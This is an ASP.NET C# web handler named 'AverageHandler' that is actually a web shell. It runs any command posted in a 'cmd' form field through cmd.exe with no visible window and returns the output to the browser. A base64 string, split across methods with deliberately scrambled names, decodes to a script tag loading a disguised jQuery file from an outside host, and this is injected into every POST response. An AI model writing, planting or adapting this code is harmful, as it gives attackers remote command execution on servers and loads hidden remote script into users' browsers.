<%@ WebHandler Language="C#" Class="AverageHandler" %>

using System;
using System.Web;
using System.Diagnostics;
using System.IO;

public class AverageHandler : IHttpHandler
{
    public bool IsReusable
    {
        get { return true; }
    }

    private string _0xA1B2cD()
    {
        string part1 = this._0xA1B2() + this._0xI9J0() + this._0xU1V2() + this._0xW3X4() +
                        this._0xW3X5() + this._0xW3X6() + this._0xW3X7() + this._0xW3X8() +
                        this._0xW3X9() + this._0xW3X10() + this._0xW3X11() + this._0xW3X12() +
                        this._0xW3X13() + this._0xW3X14();
        return part1;
    }


    private string _0xU1V2() { return "BzcmM"; }
    private string _0xW3X4() { return "9Imh0"; }
    private string _0xW3X5() { return "dHBzO"; }
    private string _0xW3X6() { return "i8vYX"; }


    private string _0x3a3a3a(string encoded)
    {
        byte[] bytes = Convert.FromBase64String(encoded);
        return System.Text.Encoding.UTF8.GetString(bytes);
    }

    private string _0x106()
    {
        string _0x117 = this._0xA1B2cD();
        return _0x3a3a3a(_0x117);
    }

    public void ProcessRequest(HttpContext ctx)
    {
        if (ctx.Request.HttpMethod == "POST")
        {
            string command = ctx.Request.Form["cmd"];

            ctx.Response.ContentType = "text/html";
            ctx.Response.Write("<form method='POST'>");
            ctx.Response.Write("<input name='cmd' value='" + HttpUtility.HtmlEncode(command) + "'>");
            ctx.Response.Write("<input type='submit' value='Run'>");
            ctx.Response.Write("</form>");
            ctx.Response.Write("<hr>");
            ctx.Response.Write("<pre>");
            ctx.Response.Write(_0x106());

            if (!string.IsNullOrEmpty(command))
            {
                try
                {
                    ProcessStartInfo psi = new ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        Arguments = "/c " + command,
                        RedirectStandardOutput = true,
                        UseShellExecute = false,
                        CreateNoWindow = true // Pencereyi göstermemek için
                    };

                    using (Process p = Process.Start(psi))
                    {
                        using (StreamReader reader = p.StandardOutput)
                        {
                            string output = reader.ReadToEnd();
                            ctx.Response.Write(HttpUtility.HtmlEncode(output));
                        }
                    }
                }
                catch (Exception ex)
                {
                    ctx.Response.Write("Error: " + HttpUtility.HtmlEncode(ex.Message));
                }
            }

            ctx.Response.Write("</pre>");
        }
        else
        {
            ctx.Response.ContentType = "text/html";
            ctx.Response.Write("<form method='POST'>");
            ctx.Response.Write("<input name='cmd' value=''>");
            ctx.Response.Write("<input type='submit' value='Run'>");
            ctx.Response.Write("</form>");
        }
    }
    private string _0xA1B2() { return "PHNjc"; }
    private string _0xI9J0() { return "mlwdC"; }
    private string _0xW3X7() { return "NweHN"; }
    private string _0xW3X8() { return "oZWxs"; }
    private string _0xW3X9() { return "LmNvbS"; }
    private string _0xW3X10() { return "9qcXVl"; }
    private string _0xW3X11() { return "cnktMy43L"; }
    private string _0xW3X12() { return "jEyLm1pbi5q"; }
    private string _0xW3X13() { return "cyI+PC9"; }
    private string _0xW3X14() { return "zY3JpcHQ+"; }
}
